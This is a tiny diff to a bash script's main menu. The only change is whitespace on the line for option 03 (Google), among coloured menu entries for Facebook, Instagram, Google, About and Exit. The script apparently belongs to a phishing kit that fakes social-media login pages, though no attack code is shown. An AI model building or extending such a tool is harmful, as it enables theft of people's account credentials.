@@ -380,7 +380,7 @@ main_menu() {
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}02${RED}]${ORANGE} Instagram 
   
-	    ${RED}[${WHITE}03${RED}]${ORANGE} Google        
+	        ${RED}[${WHITE}03${RED}]${ORANGE} Google        
 
 
 		${RED}[${WHITE}9${RED}]${ORANGE} About         ${RED}[${WHITE}0${RED}]${RED} Exit
